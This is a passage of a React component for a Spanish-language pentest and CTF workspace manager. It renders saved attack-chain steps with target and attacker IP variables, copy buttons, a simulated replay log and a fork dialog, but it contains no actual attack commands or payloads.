            <div className="p-3">
              <div className="relative">
                <Search className="absolute left-2.5 top-2.5 h-3.5 w-3.5 text-slate-500" />
                <input
                  type="text"
                  placeholder="Buscar máquina o CVE..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full bg-black/40 border border-white/10 rounded-md py-1.5 pl-8 pr-3 text-xs text-white placeholder-slate-600 focus:outline-none focus:border-emerald-500/50 font-mono"
                />
              </div>
            </div>

            {/* Quick Filter tabs buttons */}
            <div className="p-2 grid grid-cols-5 gap-0.5 bg-black/45">
              {(['All', 'HTB', 'THM', 'VulnHub', 'AD'] as const).map(tab => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`py-1 text-[9px] font-mono uppercase rounded transition cursor-pointer text-center font-bold ${
                    activeTab === tab ? 'bg-emerald-600/10 text-emerald-400 border border-emerald-500/20' : 'text-slate-500 hover:text-slate-350'
                  }`}
                >
                  {tab}
                </button>
              ))}
            </div>

            {/* Scrollable List cases */}
            <div className="flex-1 overflow-y-auto p-2 space-y-1.5 min-h-0">
              {filteredWorkspaces.length === 0 ? (
                <div className="p-4 text-center text-slate-500 font-sans text-xs italic">
                  Ningún registro coincide con el filtro activo.
                </div>
              ) : (
                filteredWorkspaces.map(w => {
                  const isSelected = w.id === selectedId;
                  const stepCount = w.nodes.length;
                  const pwndCount = w.nodes.filter(n => n.state === 'success').length;
                  const pct = stepCount > 0 ? Math.round((pwndCount / stepCount) * 100) : 0;
                  
                  // Category pill colors
                  let catColor = 'bg-blue-500/10 text-blue-300 border-blue-500/25';
                  if (w.category === 'HackTheBox') catColor = 'bg-emerald-500/10 text-emerald-300 border-emerald-500/25';
                  if (w.category === 'TryHackMe') catColor = 'bg-red-500/10 text-red-300 border-red-500/25';
                  if (w.category === 'VulnHub') catColor = 'bg-amber-500/10 text-amber-300 border-amber-500/25';

                  return (
                    <div
                      key={w.id}
                      onClick={() => {
                        setSelectedId(w.id);
                        setSimLogs([]);
                        setReplayNodeStates({});
                      }}
                      className={`p-2.5 rounded-lg border text-left transition duration-150 cursor-pointer flex flex-col gap-1.5 relative ${
                        isSelected 
                          ? 'bg-emerald-600/[0.06] border-emerald-500/40 shadow-sm' 
                          : 'bg-white/[0.01] border-white/5 hover:bg-white/[0.04] hover:border-white/10'
                      }`}
                    >
                      {/* Name & category block */}
                      <div className="flex items-start justify-between gap-1">
                        <span className="text-[11px] font-sans font-bold text-slate-100 line-clamp-1 leading-snug">{w.name}</span>
                        <span className={`text-[8px] font-mono uppercase px-1.5 py-0.5 rounded border shrink-0 ${catColor}`}>
                          {w.category === 'Real Pentest' ? 'PE' : w.category}
                        </span>
                      </div>

                      {/* Machine target */}
                      <div className="flex justify-between items-center text-[9px] font-mono text-slate-400">
                        <span>Target: <span className="text-slate-200">{w.target}</span></span>
                        <span className="text-slate-500">{stepCount} pasos</span>
                      </div>

                      {/* Custom progress visual bar */}
                      <div className="space-y-1">
                        <div className="flex justify-between text-[8px] font-mono text-slate-500">
                          <span>Progreso de Compromiso</span>
                          <span className={pct === 100 ? 'text-emerald-400 font-bold' : 'text-slate-400'}>{pct}%</span>
                        </div>
                        <div className="w-full bg-[#151722] h-1.5 rounded-full overflow-hidden border border-white/5">
                          <div 
                            className={`h-full rounded-full transition-all duration-300 ${pct === 100 ? 'bg-emerald-400' : 'bg-emerald-500/70'}`}
                            style={{ width: `${pct}%` }} 
                          />
                        </div>
                      </div>

                      {/* Delete action button */}
                      <button
                        onClick={(e) => handleDeleteWorkspace(w.id, e)}
                        className="absolute bottom-1.5 right-1.5 opacity-0 group-hover:opacity-100 focus:opacity-100 hover:text-rose-400 p-1 text-slate-500 transition cursor-pointer"
                        title="Borrar de mi repertorio"
                      >
                        <Trash2 className="h-3 w-3" />
                      </button>

                      {/* Display deletion overlay indicator on hover */}
                      <div className="absolute top-2 right-2 flex items-center justify-center opacity-40 hover:opacity-100 transition">
                        <span 
                          onClick={(e) => handleDeleteWorkspace(w.id, e)}
                          className="text-[11px] font-mono hover:text-rose-400 text-slate-600 px-1 hover:bg-neutral-900 rounded" 
                          title="Eliminar"
                        >
                          ×
                        </span>
                      </div>

                    </div>
                  );
                })
              )}
            </div>

            {/* Core current Active Workspace saver drawer */}
            <div className="p-3.5 bg-[#0f1116] border-t border-white/10 space-y-2.5">
              <span className="text-[10px] font-mono text-emerald-400 uppercase tracking-widest block font-bold flex items-center gap-1.5">
                <Plus className="h-3.5 w-3.5" /> Guardar Workspace Activo
              </span>
              
              <div className="space-y-2">
                <input
                  type="text"
                  placeholder="Nombre de la CTF (ej: HTB Legacy)"
                  value={saveName}
                  onChange={(e) => setSaveName(e.target.value)}
                  className="w-full bg-black/45 border border-white/15 rounded px-2 py-1.5 text-xs text-white placeholder-slate-600 font-sans focus:outline-none focus:border-emerald-500/50"
                />
                
                <input
                  type="text"
                  placeholder="Descripción resumida..."
                  value={saveDesc}
                  onChange={(e) => setSaveDesc(e.target.value)}
                  className="w-full bg-black/45 border border-white/15 rounded px-2 py-1.5 text-xs text-white placeholder-slate-600 font-sans focus:outline-none focus:border-emerald-500/50"
                />

                <div className="flex justify-between items-center gap-1.5">
                  <select
                    value={saveCategory}
                    onChange={(e: any) => setSaveCategory(e.target.value)}
                    className="flex-1 bg-black/45 border border-white/15 rounded px-1.5 py-1 text-[11px] text-slate-300 font-mono focus:outline-none"
                  >
                    <option value="HackTheBox">HackTheBox</option>
                    <option value="TryHackMe">TryHackMe</option>
                    <option value="VulnHub">VulnHub</option>
                    <option value="Real Pentest">Real Pentest</option>
                    <option value="Personal Writeup">Personal Writeup</option>
                  </select>

                  <button
                    onClick={handleSaveActiveWorkspace}
                    disabled={activeNodes.length === 0}
                    className="px-2.5 py-1.5 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 text-black text-[11px] font-mono font-bold rounded flex items-center gap-1.5 cursor-pointer shrink-0 transition"
                  >
                    <span>Guardar Case</span>
                  </button>
                </div>
                {activeNodes.length === 0 && (
                  <p className="text-[8.5px] italic text-rose-400/80 font-sans">No hay nodos activos en tu pizarra para guardar.</p>
                )}
              </div>
            </div>

          </div>

          {/* MAIN COLUMN RIGHT: Selected Workspace review space */}
          <div className="flex-1 flex flex-col bg-[#0b0c10] overflow-hidden">
            
            {selectedWorkspace ? (
              <div className="flex-grow flex flex-col min-h-0 overflow-y-auto">
                
                {/* Header overview area */}
                <div className="p-4 bg-[#0e1017] border-b border-white/10 flex flex-col gap-3 shrink-0 text-left">
                  <div className="flex justify-between items-start flex-wrap gap-2">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <h2 className="text-lg font-sans font-extrabold text-slate-100">{selectedWorkspace.name}</h2>
                        <span className="text-[10px] font-mono border border-emerald-500/30 text-emerald-400 rounded-full px-2.5 py-0.5 bg-emerald-950/20">
                          {selectedWorkspace.category}
                        </span>
                      </div>
                      <p className="text-xs text-slate-400 font-sans leading-relaxed max-w-3xl">{selectedWorkspace.description}</p>
                    </div>

                    <div className="flex items-center space-x-2">
                      <button
                        id="btn-rep-save-as-fork"
                        onClick={handleTriggerForkMode}
                        className="px-3.5 py-2 bg-purple-600/20 hover:bg-purple-600/30 border border-purple-500/40 text-purple-300 text-xs font-mono font-bold rounded-md cursor-pointer flex items-center space-x-2 transition"
                        title="Guardar una copia (fork/Save As) de este playbook de pruebas"
                      >
                        <Copy className="h-4 w-4 text-purple-300 font-semibold" />
                        <span>Guardar Como</span>
                      </button>

                      <button
                        id="btn-rep-load-current"
                        onClick={handleLoadToWorkspace}
                        className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-mono font-bold rounded-md shadow-lg shadow-emerald-500/10 cursor-pointer flex items-center space-x-2 transition"
                        title="Reemplazar pizarra activa con esta máquina"
                      >
                        <FolderHeart className="h-4 w-4 animate-pulse" />
                        <span>Cargar en Whiteboard</span>
                      </button>
                    </div>
                  </div>

                  <div className="pt-2 border-t border-white/5 flex flex-wrap gap-x-6 gap-y-2.5 items-center justify-between text-xs font-mono text-slate-400 select-none">
                    <div className="flex flex-wrap items-center gap-4">
                      <div className="flex items-center gap-2 bg-white/5 border border-white/10 px-2.5 py-1 rounded-md">
                        <span className="text-white/40 font-mono text-[10px] select-none">$TARGET</span>
                        <input 
                          type="text" 
                          value={target} 
                          onChange={(e) => onChangeTarget(e.target.value)}
                          placeholder="10.10.11.242"
                          className="bg-transparent border-none outline-none focus:ring-0 w-28 text-emerald-300 font-mono text-xs p-0"
                          title="Cambiar IP de Objetivo/Víctima globalmente"
                        />
                      </div>
                      <div className="flex items-center gap-2 bg-white/5 border border-white/10 px-2.5 py-1 rounded-md">
                        <span className="text-white/40 font-mono text-[10px] select-none">$ATTACKER_IP</span>
                        <input 
                          type="text" 
                          value={attackerIp} 
                          onChange={(e) => onChangeAttackerIp(e.target.value)}
                          placeholder="10.10.14.15"
                          className="bg-transparent border-none outline-none focus:ring-0 w-28 text-orange-400 font-mono text-xs p-0"
                          title="Cambiar IP de Atacante/Callback globalmente"
                        />
                      </div>
                    </div>

                    <div className="text-[10px] text-slate-500">
                      Caso Origen: {selectedWorkspace.target} | {selectedWorkspace.nodes.length} Nodos
                    </div>
                  </div>
                </div>

                {/* Split detail visualization: LEFT command flow, RIGHT live terminal simulation logs */}
                <div className="flex-1 flex overflow-hidden min-h-0 divide-x divide-white/15">
                  
                  {/* LEFT: Nodes Sequential Steps */}
                  <div className="w-1/2 overflow-y-auto p-4 space-y-4 text-left min-h-0">
                    <h3 className="text-xs font-mono text-emerald-400 uppercase tracking-widest font-bold flex items-center gap-1.5">
                      <Layers className="h-4 w-4" /> Cadena de Ataque Secuencial (Diagrama)
                    </h3>
                    
                    <div className="space-y-3.5 relative pl-3 border-l-2 border-white/10 ml-1.5">
                      {selectedWorkspace.nodes.map((node, index) => {
                        // Check simulation state override
                        const displayState = replayNodeStates[node.id] || node.state;
                        
                        // Icon matching state
                        let StatusIcon = <div className="h-2.5 w-2.5 bg-neutral-600 rounded-full" />;
                        let cardBorder = 'border-white/5 bg-zinc-950/30';
                        if (displayState === 'success') {
                          StatusIcon = <CheckCircle2 className="h-3.5 w-3.5 text-emerald-400" />;
                          cardBorder = 'border-emerald-500/20 bg-emerald-950/5';
                        } else if (displayState === 'running') {
                          StatusIcon = <RefreshCw className="h-3.5 w-3.5 text-blue-400 animate-spin" />;
                          cardBorder = 'border-blue-500/35 bg-blue-950/5';
                        } else if (displayState === 'failed') {
                          StatusIcon = <ShieldAlert className="h-3.5 w-3.5 text-rose-500" />;
                          cardBorder = 'border-rose-500/20 bg-rose-955/5';
                        }

                        // Code interpolation with variables
                        let commandDisplay = node.commandTemplate;
                        const mergedVarsForDisplay = {
                          ...selectedWorkspace.globalVars,
                          ...activeGlobalVars,
                          '$TARGET': target,
                          '$ATTACKER_IP': attackerIp
                        };
                        Object.entries(mergedVarsForDisplay).forEach(([k, v]) => {
                          commandDisplay = commandDisplay.replaceAll(k, v);
                        });

                        return (
                          <div key={node.id} className="relative group/step">
                            
                            {/* Connective Node line bubble indicator */}
                            <div className="absolute -left-6.5 top-1.5 h-6 w-6 rounded-full bg-[#0c0d12] border border-white/10 flex items-center justify-center z-10 shrink-0">
                              <span className="text-[10px] font-mono text-slate-400">{index + 1}</span>
                            </div>

                            {/* Node body card */}
                            <div className={`p-3 rounded-lg border flex flex-col gap-2 transition ${cardBorder}`}>
                              <div className="flex justify-between items-center">
                                <div className="flex items-center space-x-1.5">
                                  <span className="text-[9px] font-mono border border-white/10 rounded px-1.5 bg-white/5 uppercase text-slate-300 font-bold shrink-0">{node.tool}</span>
                                  <span className="text-xs font-sans font-bold text-slate-100">{node.title}</span>
                                </div>
                                <div className="flex items-center gap-1.5 scale-95">
                                  {StatusIcon}
                                  <span className="text-[9px] font-mono tracking-wider uppercase text-slate-500">{displayState}</span>
                                </div>
                              </div>

                              <p className="text-[11px] text-slate-400 font-sans leading-relaxed">{node.description}</p>

                              {/* Formatted shell box */}
                              <div className="bg-black/75 rounded p-2 border border-white/5 min-h-[34px] flex items-center justify-between font-mono text-[10px] text-slate-300 relative group/shell">
                                <span className="font-mono text-left w-5/6 break-all select-all pr-4">{commandDisplay}</span>
                                <button
                                  onClick={() => {
                                    navigator.clipboard.writeText(commandDisplay);
                                    setCopiedNodeId(node.id);
                                    setTimeout(() => setCopiedNodeId(null), 1500);
                                    onLogMessage('command_copied', `Copied offensive step command block: ${commandDisplay}`);
                                  }}
                                  className="absolute right-1.5 top-1.5 p-1 bg-white/5 hover:bg-white/10 border border-white/15 hover:border-white/20 rounded cursor-pointer transition text-slate-400 hover:text-white"
                                  title="Copy command to clipboard"
                                >
                                  {copiedNodeId === node.id ? (
                                    <Check className="h-3 w-3 text-emerald-400" />
                                  ) : (
                                    <Copy className="h-3 w-3" />
                                  )}
                                </button>
                              </div>

                              {/* Show findings indicator details if available */}
                              {node.evidenceProduced.findings && (
                                <div className="text-[10px] font-sans text-emerald-400 bg-emerald-950/10 border border-emerald-900/35 p-1.5 rounded leading-relaxed">
                                  <span className="font-mono font-bold block text-[9px] text-emerald-500 uppercase tracking-widest leading-none mb-1">Evidence Captured ✓</span>
                                  <span className="whitespace-pre-line text-slate-450">{node.evidenceProduced.findings}</span>
                                </div>
                              )}

                            </div>

                          </div>
                        );
                      })}
                    </div>

                  </div>

                  {/* RIGHT: Live simulation terminal panel */}
                  <div className="w-1/2 flex flex-col bg-black/45 min-h-0 text-left relative">
                    
                    {/* Header bar controls */}
                    <div className="p-3 bg-zinc-950/80 border-b border-white/10 flex items-center justify-between shrink-0">
                      <div className="flex items-center space-x-2 font-mono text-xs text-slate-200">
                        <Terminal className="h-4 w-4 text-emerald-400 animate-pulse" />
                        <span>INTERACTIVE REPLICATOR LOGS</span>
                      </div>
                      
                      <button
                        id="btn-trigger-rep-sim"
                        onClick={handleStartSimulatedReplay}
                        disabled={replaying || selectedWorkspace.nodes.length === 0}
                        className="px-3.5 py-1 bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 text-black text-[11px] font-mono font-bold rounded cursor-pointer transition flex items-center space-x-1"
                        title="Launch step-by-step diagnostic attack chain simulation"
                      >
                        <Play className="h-3.5 w-3.5" />
                        <span>{replaying ? 'Replicating...' : 'Replicar Ataque (Live)'}</span>
                      </button>
                    </div>

                    {/* Console scrollbox */}
                    <div className="flex-1 overflow-y-auto p-4 bg-black font-mono text-[11px] text-slate-300 leading-relaxed space-y-1.5 selection:bg-emerald-500/40">
                      
                      {simLogs.length === 0 ? (
                        <div className="h-full flex flex-col items-center justify-center text-center space-y-2 select-none text-slate-500 p-8">
                          <Terminal className="h-8 w-8 text-slate-600" />
                          <p className="font-sans text-xs">Simulador de replicación de ataque inactivo.</p>
                          <p className="font-sans text-[10px] text-slate-650 max-w-xs leading-relaxed">
                            Pulse "Replicar Ataque (Live)" en la zona superior para simular la ejecución secuencial completa con salida de consola de comandos, troyanos y triggers.
                          </p>
                        </div>
                      ) : (
                        simLogs.map((log, lidx) => {
                          let lineClass = 'text-slate-300';
                          if (log.includes('✔️') || log.includes('CAPTURED') || log.includes('✔️ CAPTURED')) lineClass = 'text-emerald-450';
                          if (log.includes('⚔️') || log.includes('⚡')) lineClass = 'text-emerald-400 font-bold';
                          if (log.includes('👉 Payload')) lineClass = 'text-pink-400 text-[10px] pl-3.5 italic';
                          if (log.includes('🔍 Hallazgos')) lineClass = 'text-blue-405 pl-4';
                          if (log.includes('🔑 Credencial')) lineClass = 'text-amber-300 font-bold border border-amber-500/10 bg-amber-500/5 px-1 py-0.5 rounded pl-4';
                          
                          return (
                            <div key={lidx} className={`${lineClass} whitespace-pre-wrap break-all`}>
                              {log}
                            </div>
                          );
                        })
                      )}
                    </div>

                  </div>
                  
                </div>

              </div>
            ) : (
              <div className="flex-1 flex flex-col items-center justify-center text-center text-slate-500 p-8">
                <FolderHeart className="h-10 w-10 text-slate-700 animate-pulse" />
                <p className="text-sm font-sans mt-2">Ningún Pentest seleccionado.</p>
                <p className="text-xs font-sans text-slate-650 max-w-sm">Use la barra izquierda para seleccionar o catalogar una de las máquinas de penetración cargadas en el archivo.</p>
              </div>
            )}

          </div>

        </div>

      </div>

      {/* Save As (Guardar Como / Fork Playbook) Dialog Modal */}
      {showForkModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/85 backdrop-blur-md transition-all duration-200">
          <div className="w-full max-w-md bg-[#0c0e12] border border-purple-500/30 rounded-xl shadow-[0_0_35px_rgba(139,92,246,0.15)] overflow-hidden scale-100 p-5 space-y-4">
            
            <div className="flex items-center justify-between border-b border-purple-500/10 pb-3">
              <div className="flex items-center space-x-2 text-purple-400 font-bold">
                <Copy className="h-5 w-5" />
                <h3 className="font-mono text-xs uppercase tracking-wider">Guardar copia como...</h3>
              </div>
              <button
                onClick={() => setShowForkModal(false)}
                className="p-1 rounded bg-white/5 border border-white/5 text-slate-400 hover:text-white hover:bg-white/10 transition cursor-pointer"
                title="Cerrar"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <div className="space-y-4 text-left">
              <div className="space-y-1">
                <label className="text-[10px] font-mono font-bold text-purple-400 uppercase block">Nombre de la copia</label>
                <input
                  type="text"
                  placeholder="Introduce un nuevo nombre para esta variante..."
                  value={forkName}
                  onChange={(e) => setForkName(e.target.value)}
                  className="w-full bg-[#12161f] border border-white/15 focus:border-purple-500/60 rounded px-3 py-2 text-xs text-white placeholder-slate-600 font-sans focus:outline-none transition"
                  autoFocus
                />
              </div>

              <div className="space-y-1">
                <label className="text-[10px] font-mono font-bold text-purple-400 uppercase block">Categoría del Catálogo</label>
                <select
                  value={forkCategory}
                  onChange={(e: any) => setForkCategory(e.target.value)}
                  className="w-full bg-[#12161f] border border-white/15 focus:border-purple-500/60 rounded px-3 py-2 text-xs text-slate-200 font-mono focus:outline-none transition"
                >
                  <option value="HackTheBox">HackTheBox</option>
                  <option value="TryHackMe">TryHackMe</option>
                  <option value="VulnHub">VulnHub</option>
                  <option value="Real Pentest">Real Pentest</option>
                  <option value="Personal Writeup">Personal Writeup</option>
                </select>
              </div>

              <div className="space-y-1">
                <label className="text-[10px] font-mono font-bold text-purple-400 uppercase block">Notas / Descripción</label>
                <textarea
                  placeholder="Escribe detalles o notas para diferenciar esta variante..."
                  value={forkDesc}
                  onChange={(e) => setForkDesc(e.target.value)}
                  className="w-full h-24 bg-[#12161f] border border-white/15 focus:border-purple-500/60 rounded px-3 py-2 text-xs text-white placeholder-slate-600 font-sans focus:outline-none transition resize-none font-sans"
                />
              </div>
            </div>

            <div className="flex items-center justify-end space-x-2 pt-3 border-t border-purple-500/10">
              <button
                onClick={() => setShowForkModal(false)}
                className="px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-md text-xs font-mono font-semibold text-slate-400 hover:text-slate-200 transition cursor-pointer"
              >
                Cancelar
              </button>
              <button
                onClick={handleConfirmFork}
                className="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white rounded-md text-xs font-mono font-bold shadow-md shadow-purple-500/10 transition cursor-pointer"
              >
                Confirmar y Registrar
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
